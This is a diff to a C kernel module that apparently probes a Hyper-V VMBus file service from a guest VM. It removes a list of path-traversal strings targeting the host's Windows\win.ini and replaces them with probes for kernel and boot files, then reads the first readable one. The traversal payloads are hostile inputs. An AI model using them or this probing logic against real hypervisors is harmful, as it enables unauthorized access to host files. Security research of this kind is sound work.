@@ -23,22 +23,14 @@ struct frame {
 } __packed;
 
 static const char *const paths[] = {
-	"\\..\\Windows\\missing-3900000",
-	"\\..\\Windows\\win.ini",
-	"\\..\\..\\Windows\\missing-3900000",
-	"\\..\\..\\Windows\\win.ini",
-	"\\..\\..\\..\\Windows\\missing-3900000",
-	"\\..\\..\\..\\Windows\\win.ini",
-	"\\..\\..\\..\\..\\Windows\\missing-3900000",
-	"\\..\\..\\..\\..\\Windows\\win.ini",
-	"\\..\\..\\..\\..\\..\\Windows\\missing-3900000",
-	"\\..\\..\\..\\..\\..\\Windows\\win.ini",
-	"\\..\\..\\..\\..\\..\\..\\Windows\\missing-3900000",
-	"\\..\\..\\..\\..\\..\\..\\Windows\\win.ini",
-	"\\..\\..\\..\\..\\..\\..\\..\\Windows\\missing-3900000",
-	"\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini",
-	"\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\missing-3900000",
-	"\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini",
+	"\\.",
+	"\\vmlinux",
+	"\\vmlinuz",
+	"\\kernel.vmgs",
+	"\\reference_info.cose",
+	"\\EFI\\BOOT\\BOOTX64.EFI",
+	"\\boot\\kernel",
+	"\\missing-3900000",
 };
 
 static struct vmbus_channel *channel;
@@ -54,6 +46,7 @@ static struct frame tx;
 static unsigned char rx[512];
 static unsigned int phase;
 static unsigned int path_index;
+static unsigned int readable_index = UINT_MAX;
 
 static void put32(void *destination, u32 value)
 {
@@ -172,10 +165,14 @@ static void hvraw_callback(void *context)
 
 			pr_info("VMBFS_INFO path=%s status=%u flags=%u size=%llu\n",
 				paths[path_index], status, flags, size);
-			if ((path_index & 1) && status == 0 && size) {
-				send_read(path_index);
-			} else if (++path_index < ARRAY_SIZE(paths)) {
+			if (status == 0 && !(flags & 1) && size &&
+			    readable_index == UINT_MAX)
+				readable_index = path_index;
+			if (++path_index < ARRAY_SIZE(paths)) {
 				send_info(path_index);
+			} else if (readable_index != UINT_MAX) {
+				path_index = readable_index;
+				send_read(path_index);
 			}
 		} else if (message == VMBFS_READ_RESPONSE) {
 			u32 returned = pipe_length >= 12 ? pipe_length - 12 : 0;
